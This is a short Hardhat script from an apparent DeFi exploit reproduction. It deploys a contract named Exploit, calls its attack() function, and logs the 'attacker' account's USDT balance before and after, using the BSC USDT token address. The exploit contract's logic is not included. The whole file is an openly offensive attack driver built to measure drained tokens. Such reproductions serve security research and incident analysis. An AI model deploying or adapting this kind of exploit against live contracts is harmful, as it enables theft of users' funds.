import hre from "hardhat"
import {Exploit__factory, IERC20__factory} from "../typechain";

async function main() {
    const [signer] = await hre.ethers.getSigners();
    const usdt = IERC20__factory.connect("0x55d398326f99059fF775485246999027B3197955",signer);
    const exploit = await new Exploit__factory(signer).deploy();

    console.log("USDT balance of attacker:",hre.ethers.utils.formatUnits(await usdt.balanceOf(signer.address),await usdt.decimals()))
    console.log("Exploiting...")
    await exploit.attack();
    console.log("Exploit complete.")
    console.log("USDT balance of attacker:",hre.ethers.utils.formatUnits(await usdt.balanceOf(signer.address),await usdt.decimals()))
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});